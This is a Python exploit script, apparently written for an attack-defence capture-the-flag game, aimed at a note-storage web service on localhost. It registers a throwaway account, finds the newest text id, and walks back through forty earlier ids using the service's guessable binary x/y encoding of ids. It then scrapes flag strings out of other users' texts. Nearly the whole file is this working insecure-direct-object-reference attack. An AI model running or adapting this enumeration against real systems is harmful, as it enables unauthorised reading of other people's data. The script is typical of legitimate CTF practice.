#!/usr/bin/env python3

import sys
import requests
import hashlib
import re
from random import choice


alph_full = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
alph_caps = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
names = ['goliath', 'royal', 'dacota', 'marry', 'hunter', 'twilight' ,'smile' ,'castle', 'lucky', 'wolf']
FlagRegExp = re.compile(r'[A-Za-z0-9]{31}=')

#ip = sys.argv[1]
ip = '127.0.0.1'
port = '5002'
host = f'{ip}:{port}'


def id_gen( size = 10, first = names, next = alph_full ):
	beg = choice(first)
	return  beg + ''.join(choice(next) for i in range(size - len(beg)))


def main():

	flags = ''

	u_name = id_gen(next=alph_caps)
	passwd = id_gen(first=alph_full)
		
	register( u_name, passwd )
	sess = login( u_name, passwd )
		
	lim = int( new_text_id(sess) )

	for t_id in range( lim - 40, lim ):

		code = encrypt( t_id )

		for flag in view_text( sess, code ):
			flags += flag + '\n'

	print( flags, flush=True )



def register( u_name, passwd ):
	#http://127.0.0.1:5002/register | POST | login=name&type=1&password=pass
	requests.post(f'http://{host}/register', data = {'login':u_name, 'type':'1', 'password':passwd})


def login( u_name, passwd ):
	#http://127.0.0.1:5002/login | POST | login=name&password=pass
	s = requests.session()
	s.post(f'http://{host}/login', data = {'login':u_name, 'password':passwd})
	return s


def new_text_id( s ):
	#http://127.0.0.1:5002/create | POST | name=text&text=flag
	data = s.post(f'http://{host}/create', data={"name":"Some hacker's text", "text":"I'm hacking u <3"})
	return re.findall( '/text/(\d+)', data.text )[0]


def encrypt( t_id ):
    bin_string = bin(t_id)[2:]
    bin_string = bin_string.replace('0', 'x')
    bin_string = bin_string.replace('1', 'y')
    return bin_string


def view_text( s, code ) -> list:
	#http://127.0.0.1:5002/find?item=yxy | GET 
	data = s.get(f'http://{host}/find?item={code}')
	return FlagRegExp.findall( data.text )


if __name__ == '__main__':
	main()